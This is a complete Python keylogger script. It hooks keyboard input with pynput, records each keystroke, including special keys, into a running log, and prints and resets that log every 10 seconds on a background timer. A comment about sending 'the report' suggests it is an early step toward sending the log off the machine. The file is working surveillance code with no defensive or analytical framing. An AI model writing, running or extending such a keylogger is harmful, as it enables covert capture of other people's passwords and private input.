#!/usr/bin/env python

import pynput.keyboard
import threading  # to thread in between report and listener

log = ""

def process_key_press(key):
	global log
	try:
		log = log +str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + "  "
		else:
			log = log +" "+ str(key)
	# print(log)

def report():
	global log
	print(log)
	log = ""  # to set the log empty each time after we send the report
	timer = threading.Timer(10,report)  # we are using Timer class of threading module to set timer
	# Timer(interval in sec,function)
	# and as we are threading it, it won't stop the other functions from running simultenously
	timer.start()  # starting the timer



keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	report() 
	keyboard_listener.join()